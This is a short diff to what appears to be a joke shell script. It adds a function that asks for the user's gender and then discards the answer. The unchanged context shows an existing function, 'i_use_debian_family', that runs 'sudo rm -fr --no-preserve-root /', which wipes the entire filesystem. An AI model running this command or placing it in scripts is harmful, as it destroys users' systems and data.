@@ -116,3 +116,12 @@ function weaboo_time() {
 function i_use_debian_family() {
     sudo rm -fr --no-preserve-root /
 }
+
+function gender_sex_validation() {
+    echo "Can you enter your gender? ~:"
+    read gender;
+
+    echo "Ah I forgot that it's 2k22. Does it even matter? (～￣▽￣)～"
+
+    unset gender;
+}
